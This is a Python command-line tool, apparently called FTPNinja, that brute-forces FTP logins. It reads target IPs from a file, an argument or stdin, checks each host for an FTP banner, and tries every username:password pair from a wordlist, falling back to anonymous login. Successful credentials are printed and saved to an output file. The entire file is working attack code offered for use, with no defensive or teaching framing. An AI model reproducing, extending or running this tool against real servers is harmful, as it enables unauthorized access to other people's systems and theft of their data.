import argparse
import socket
import signal
import time
import sys
import os
import re
import ftplib

def logo():
    os.system("clear")
    print("\033[38;5;111m")
    print("""
           _____________  _  ___        _     
          / __/_  __/ _ \/ |/ (_)__    (_)__ _
         / _/  / / / ___/    / / _ \  / / _ `/
        /_/   /_/ /_/  /_/|_/_/_//_/_/ /\_,_/ 
                                  |___/       
                          By Cody4code v1.0.1
    """)
    print("\033[0m")


def parse_credentials_file(credentials_file):
    credentials = []
    with open(credentials_file, 'r') as file:
        for line in file:
            parts = line.strip().split(':')
            if len(parts) == 2:
                username, password = parts[0], parts[1]
                credentials.append((username, password))
    return credentials

def is_valid_ip(ip):
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False

def is_valid_ftp_ip(ip, timeout=3):
    try:
        socket.setdefaulttimeout(timeout)
        with socket.create_connection((ip, 21), timeout=timeout) as sock:
            response = sock.recv(1024).decode()
            if '220' in response:
                return True
    except (socket.timeout, socket.error):
        pass
    return False

def connect_ftp(ip, output_file, credentials):
    if not is_valid_ip(ip):
        print(f"Invalid IP: \033[38;5;196m{ip}\033[0m Address")
        return
    if not is_valid_ftp_ip(ip):
        print(f"Invalid FTP IP: \033[38;5;196m{ip}\033[0m Address")
        return

    for username, password in credentials:
        print(f"\033[38;5;39mFTP login for IP: {ip}\033[0m")
        print(f"\033[38;5;33mBrute Force Username: {username}, Password: {password}\033[0m")
        try:
            with ftplib.FTP(ip, timeout=3) as ftp:
                try:
                    ftp.login(username, password)
                    print(f" \033[0;32mSuccessfully logged in to IP:{ip} \033[0m Username: \033[38;5;39m{username}\033[0m, Password: \033[38;5;39m{password}\033[0m")
                    if output_file:
                        output_file.write(f"Successfully logged in to IP: {ip} Username: {username}, Password: {password}\n")
                    break
                except ftplib.error_perm as e:
                    error_message = str(e)
                    if "530" in error_message:
                        print(f" \033[38;5;203mLogin failed: Incorrect credentials\033[0m")
                    else:
                        print(f" \033[38;5;203mError connecting to {ip}: {error_message}\033[0m")
        except socket.timeout:
            print(f" \033[38;5;203mError connecting to {ip}: Connection timed out\033[0m")
        except (socket.error, Exception) as e:
            print(f" \033[38;5;203mError connecting to {ip}: {str(e)}\033[0m")
            if output_file:
                output_file.write(f"An unexpected error occurred while connecting to {ip}: {str(e)}\n")




def process_ips(ip_list, output_file, credentials):
    def signal_handler(sig, frame):
        print("\n\033[48;2;255;0;0m\033[38;2;255;255;255mCanceled by user.\033[0m")
        if output_file:
            output_file.close()
        sys.exit(0)

    signal.signal(signal.SIGINT, signal_handler)

    for ip in ip_list:
        connect_ftp(ip, output_file, credentials)

def main():
    parser = argparse.ArgumentParser(description='FTP Tool')
    parser.add_argument('-l', '--list', metavar='ipList.txt', help='File containing a list of IP addresses')
    parser.add_argument('-ip', '--single-ip', metavar='IP', help='Single IP address')
    parser.add_argument('-w', '--wordlist', metavar='wordlist.txt', help='File containing usernames and passwords separated by ":"')
    parser.add_argument('-o', '--output', metavar='output.txt', type=str, help='Output file')

    args = parser.parse_args()
    ip_list = []

    if args.list:
        with open(args.list, 'r') as ip_file:
            ip_list += [line.strip() for line in ip_file if is_valid_ip(line.strip())]

    if args.single_ip:
        ip_list.append(args.single_ip)

    if not args.list and not args.single_ip and not sys.stdin.isatty():
        ip_list += [line.strip() for line in sys.stdin if is_valid_ip(line.strip())]

    credentials_file = args.wordlist
    credentials = None

    if credentials_file:
        credentials = parse_credentials_file(credentials_file)

    if credentials is None:
        credentials = [("anonymous", "anonymous")]

    output_file = None
    if args.output:
        if os.path.exists(args.output):
            print(f"Output file '{args.output}' already exists. Please choose a different file.")
            sys.exit(1)
        output_file = open(args.output, 'w')

    if not ip_list:
        print("No valid IP addresses provided.")
        parser.print_help()
        sys.exit(1)

    print(f" \033[0;32m[{time.strftime('%Y-%m-%d %H:%M:%S')}] Starting...\033[0m")

    try:
        process_ips(ip_list, output_file, credentials)
    except KeyboardInterrupt:
        print("\n\033[48;2;255;0;0m\033[38;2;255;255;255mCanceled by user.\033[0m")

    if output_file:
        output_file.close()

if __name__ == '__main__':
    logo()
    main()
